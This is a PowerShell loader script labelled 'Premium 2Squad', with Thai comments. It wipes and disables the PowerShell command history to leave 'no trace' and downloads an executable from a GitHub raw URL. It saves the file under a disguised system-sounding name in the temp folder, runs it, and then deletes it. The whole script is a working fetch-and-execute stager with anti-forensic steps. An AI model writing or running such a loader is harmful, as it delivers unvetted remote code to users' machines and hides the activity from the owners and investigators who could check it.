# =========================================================================
# PREMIUM 2SQUAD - TEMP LOADER (STABLE VERSION)
# =========================================================================
$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "PREMIUM 2SQUAD - LOADER"
Clear-Host

Write-Host ""
Write-Host "        ___  ___  ___  _  __ __  _____  __  __ __ " -ForegroundColor Cyan
Write-Host "       / _ \/ _ \/ __// |/ // / / /   |/ / / // / " -ForegroundColor Cyan
Write-Host "      / ___/ , _/ _/ /    // /_/ / /| / /_/ // /_ " -ForegroundColor Cyan
Write-Host "     /_/  /_/|_/___//_/|_/ \____/_/ |_/____//___/ " -ForegroundColor Cyan
Write-Host "  ========================================================" -ForegroundColor DarkGray
Write-Host "          P R E M I U M   2 S Q U A D   L O A D E R" -ForegroundColor White
Write-Host "  ========================================================" -ForegroundColor DarkGray
Write-Host ""

# ==========================================
# AUTO HISTORY CLEANUP
# ==========================================
Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping traces..." -ForegroundColor White

$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) {
    # ลบเนื้อหาไฟล์ประวัติและปิดการเซฟ
    Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue
    Clear-History
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    
    Start-Sleep -Milliseconds 500
    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " System cleaned perfectly. No trace left." -ForegroundColor Green
}
Write-Host ""

# ==========================================
# SECURE TEMP DOWNLOAD & EXECUTION
# ==========================================
Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server..." -ForegroundColor White

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# สร้างตัวเลขสุ่มเพื่อกัน Cache ของ GitHub
$RandomHash = Get-Random

try {
    # ลิ้งก์โหลดไฟล์ EXE ของคุณ
    $ExeURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/main/dxgi.exe?t=$RandomHash"
    
    # กำหนดเส้นทางซ่อนไฟล์ในโฟลเดอร์ชั่วคราว (Temp) ของเครื่อง
    $TempPath = Join-Path $env:TEMP "sys_host_$RandomHash.exe"
    
    # ดาวน์โหลดไฟล์ไปไว้ที่ Temp
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile($ExeURL, $TempPath)
    
    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Payload ready." -ForegroundColor Green
    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Executing Application..." -ForegroundColor White
    
    Start-Sleep -Seconds 1
    
    # สั่งรันไฟล์ และรอจนกว่าผู้ใช้จะกดปิดโปรแกรม (-Wait)
    Start-Process -FilePath $TempPath -Wait
    
    # ทันทีที่หน้าต่างโปรแกรมถูกปิด สคริปต์จะลบไฟล์นั้นทิ้งทันที
    Remove-Item -Path $TempPath -Force -ErrorAction SilentlyContinue
    
} catch {
    Write-Host "`n  [!] Execution Failed: $($_.Exception.Message)" -ForegroundColor Red
}
